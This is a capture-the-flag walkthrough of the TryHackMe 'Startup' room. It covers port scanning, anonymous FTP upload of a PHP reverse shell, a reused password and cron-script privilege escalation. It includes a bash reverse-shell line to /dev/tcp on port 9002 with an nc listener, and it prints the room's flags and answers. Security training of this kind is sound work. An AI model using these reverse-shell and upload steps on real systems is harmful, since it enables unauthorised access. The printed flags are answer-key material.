# Startup

Abuse traditional vulnerabilities via untraditional means.

[Startup](https://tryhackme.com/room/startup)

## Topic's

- Network Enumeration
- Web Enumeration
- FTP Enumeration
- FTP Exploitation
- Network Forensic
- Crontab Manipulation

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Welcome to Spice Hut!

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!

```
kali@kali:~/CTFs/tryhackme/Startup$ sudo nmap -A -sS -sC -sV -O 10.10.36.184
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 13:27 CET
Nmap scan report for 10.10.36.184
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/13%OT=21%CT=1%CU=37615%PV=Y%DS=2%DC=T%G=Y%TM=5FAE7B
OS:C3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   30.28 ms 10.8.0.1
2   37.46 ms 10.10.36.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
```

```
kali@kali:~/CTFs/tryhackme/Startup$ gobuster dir -u http://10.10.36.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.36.184/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/13 13:34:12 Starting gobuster
===============================================================
/files (Status: 301)
Progress: 20964 / 220561 (9.50%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/11/13 13:35:22 Finished
===============================================================
```

[http://10.10.36.184/files/](http://10.10.36.184/files/)

```
kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184
Connected to 10.10.36.184.
220 (vsFTPd 3.0.3)
Name (10.10.36.184:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
226 Directory send OK.
ftp> mget *
mget ftp?
200 PORT command successful. Consider using PASV.
550 Failed to open file.
mget important.jpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.59 secs (417.2951 kB/s)
mget notice.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (140.4737 kB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
226 Directory send OK.
ftp>
```

`but Maya is looking pretty sus.`

```
kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184
Connected to 10.10.36.184.
220 (vsFTPd 3.0.3)
Name (10.10.36.184:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (67.1729 MB/s)
ftp> exit
221 Goodbye.
```

```
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

```
$ scp suspicious.pcapng kali@10.8.106.222:/home/kali/CTFs/tryhackme/Startup
Could not create directory '/var/www/.ssh'.
The authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.
ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
kali@10.8.106.222's password:
suspicious.pcapng                             100%   30KB  30.5KB/s   00:00
www-data@startup:/incidents$
```

```
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data:

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
```

```
lennie@startup:~$ ls -lA
total 12
drwxr-xr-x 2 lennie lennie 4096 Nov 12 04:53 Documents
drwxr-xr-x 2 root   root   4096 Nov 12 04:54 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

```
lennie@startup:~$ ls -lA scripts/
total 8
-rwxr-xr-x 1 root root 77 Nov 12 04:53 planner.sh
-rw-r--r-- 1 root root  1 Nov 13 12:55 startup_list.txt
lennie@startup:~$ cat scripts/startup_list.txt

lennie@startup:~$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~$ echo $LIST

lennie@startup:~$
```

```bash
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/9002 0>&1'
```

```
kali@kali:~/CTFs/tryhackme/Startup$ nc -lnvp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.36.184 36364
bash: cannot set terminal process group (1690): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls -lA
ls -lA
total 20
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 2 root root 4096 Nov 12 04:54 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   38 Nov 12 04:53 root.txt
drwx------ 2 root root 4096 Nov 12 04:50 .ssh
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

What is the secret spicy soup recipe?

`love`

What are the contents of user.txt?

`THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

What are the contents of root.txt?

`THM{f963aaa6a430f210222158ae15c3d76d}`

## Task 2 Credits

Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!

I'd like to thank my [coffee](https://elbee.xyz/) as this took me hours to make, being that it is the first time I have done something like this.

I'd like to thank [ku5e](https://tryhackme.com/p/ku5e) for being a good sensei and [GeneralClaw](https://tryhackme.com/p/GeneralClaw), my grammar cop.

I'd like to thank my testers [Amit25095](https://tryhackme.com/p/Amit25095), [Krypt0c](https://tryhackme.com/p/Krypt0c), [BarZigmon](https://tryhackme.com/p/BarZigmon) and [powershot](https://tryhackme.com/p/powershot).

Additionally, I'd love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community.

And of course, I'd like to thank you for playing. Hope to see you soon!

Congratulations!

`No answer needed`
